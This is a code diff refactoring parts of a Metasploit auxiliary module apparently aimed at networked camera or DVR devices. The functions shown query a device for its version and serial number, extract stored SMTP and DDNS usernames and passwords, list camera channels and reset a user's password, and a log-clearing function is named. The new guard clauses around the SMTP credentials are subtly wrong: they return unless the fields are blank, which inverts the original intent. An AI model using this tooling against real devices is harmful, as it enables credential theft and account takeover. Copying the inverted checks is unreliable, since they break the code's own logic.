@@ -84,20 +84,18 @@ class Metasploit3 < Msf::Auxiliary
     connect
     sock.put(VERSION)
     data = sock.get_once
-    if data =~ /[\x00]{8,}([[:print:]]+)/
-      ver = Regexp.last_match[1]
-      print_good("#{peer} -- version: #{ver}")
-    end
+    return unless data =~ /[\x00]{8,}([[:print:]]+)/
+    ver = Regexp.last_match[1]
+    print_good("#{peer} -- version: #{ver}")
   end
 
   def grab_serial
     connect
     sock.put(SN)
     data = sock.get_once
-    if data =~ /[\x00]{8,}([[:print:]]+)/
-      serial = Regexp.last_match[1]
-      print_good("#{peer} -- serial number: #{serial}")
-    end
+    return unless data =~ /[\x00]{8,}([[:print:]]+)/
+    serial = Regexp.last_match[1]
+    print_good("#{peer} -- serial number: #{serial}")
   end
 
   def grab_email
@@ -112,17 +110,15 @@ class Metasploit3 < Msf::Auxiliary
       print_status("  Server Port: #{mailhost[1]}") unless mailhost[1].nil?
       print_status("  Destination Email: #{data[1]}") unless mailhost[1].nil?
     end
-    if !data[5].nil? && !data[6].nil?
-      print_good("  SMTP User: #{data[5]}") unless data[5].nil?
-      print_good("  SMTP Password: #{data[6]}") unless data[6].nil?
-      muser = "#{data[5]}"
-      mpass = "#{data[6]}"
-      mailserver = "#{mailhost[0]}"
-      mailport = "#{mailhost[1]}"
-      if !mailserver.to_s.strip.length == 0 && !mailport.to_s.strip.length == 0 && !muser.to_s.strip.length == 0 && !mpass.to_s.strip.length == 0
-        report_email_creds(mailserver, mailport, muser, mpass) if !mailserver.nil? && !mailport.nil? && !muser.nil? && !mpass.nil?
-      end
-    end
+    return unless data[5].blank? && data[6].blank?
+    print_good("  SMTP User: #{data[5]}")
+    print_good("  SMTP Password: #{data[6]}")
+    muser = "#{data[5]}"
+    mpass = "#{data[6]}"
+    mailserver = "#{mailhost[0]}"
+    mailport = "#{mailhost[1]}"
+    return unless mailserver.blank? && mailport.blank? && muser.blank? && mpass.blank?
+    report_email_creds(mailserver, mailport, muser, mpass)
   end
 
   def grab_ddns
@@ -146,7 +142,7 @@ class Metasploit3 < Msf::Auxiliary
       print_status("  Domain: #{ddns_domain}")
       print_good("  Username: #{ddns_user}")
       print_good("  Password: #{ddns_pass}")
-      if !ddns_server.to_s.strip.length == 0 && !ddns_port.to_s.strip.length == 0 && !ddns_user.to_s.strip.length == 0 && !ddns_pass.to_s.strip.length == 0
+      unless ddns_server.blank? && ddns_port.blank? && ddns_user.blank? && ddns_pass.blank?
         report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
       end
     end
@@ -187,10 +183,9 @@ class Metasploit3 < Msf::Auxiliary
     sock.put(CHANNELS)
     data = sock.get_once.split('&&')
     disconnect
-    if data.length > 1
-      print_good("#{peer} -- camera channels:")
-      data.each_with_index { |val, index| print_status("  #{index + 1}:#{val[/([[:print:]]+)/]}") }
-    end
+    return unless data.length > 1
+    print_good("#{peer} -- camera channels:")
+    data.each_with_index { |val, index| print_status("  #{index + 1}:#{val[/([[:print:]]+)/]}") }
   end
 
   def grab_users
@@ -246,9 +241,8 @@ class Metasploit3 < Msf::Auxiliary
     sock.put(u3)
     sock.get_once
     sock.put(u1)
-    if sock.get_once
-      print_good("#{peer} -- user #{datastore['USERNAME']}'s password reset to #{@password}")
-    end
+    return unless sock.get_once
+    print_good("#{peer} -- user #{datastore['USERNAME']}'s password reset to #{@password}")
   end
 
   def clear_logs
